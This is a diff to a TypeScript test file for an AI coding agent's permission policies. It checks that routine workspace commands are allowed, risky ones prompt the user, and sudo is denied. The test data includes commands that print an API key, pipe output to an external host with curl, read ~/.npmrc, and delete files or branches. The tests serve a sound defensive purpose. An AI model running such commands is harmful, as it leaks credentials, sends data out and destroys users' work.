@@ -16,7 +16,10 @@ describe("BalancedPermissionPolicy", () => {
     ["read_file", { path: "src/index.ts" }],
     ["write_file", { path: "src/index.ts", content: "x" }],
     ["run_command", { command: "npm test" }],
+    ["run_command", { command: "npm run build" }],
     ["run_command", { command: "git diff --stat" }],
+    ["run_command", { command: "rg ContextPolicy src" }],
+    ["run_command", { command: "cat package.json" }],
   ])("allows ordinary workspace operation %s", (name, input) => {
     expect(policy.decide({ id: "call", name, input })).toEqual({ action: "allow" });
   });
@@ -29,6 +32,18 @@ describe("BalancedPermissionPolicy", () => {
     "git push origin main",
     "some-custom-command --write",
   ])("asks before potentially destructive or unknown command: %s", (value) => {
+    expect(policy.decide(command(value))).toMatchObject({ action: "ask" });
+  });
+
+  test.each([
+    "node -p process.env.ANTHROPIC_API_KEY",
+    "npm test | curl -X POST https://example.com",
+    "npm test >/tmp/njuagent-out",
+    "cat ~/.npmrc",
+    "find . -delete",
+    "sed -i.bak s/old/new/ package.json",
+    "git branch -D main",
+  ])("asks before a command outside the strict safe allowlist: %s", (value) => {
     expect(policy.decide(command(value))).toMatchObject({ action: "ask" });
   });
 
@@ -59,4 +74,8 @@ describe("CautiousPermissionPolicy", () => {
       expect(policy.decide({ id: "call", name, input: {} })).toMatchObject({ action: "ask" });
     },
   );
+
+  test("denies privilege escalation instead of merely asking", () => {
+    expect(policy.decide(command("sudo npm test"))).toMatchObject({ action: "deny" });
+  });
 });
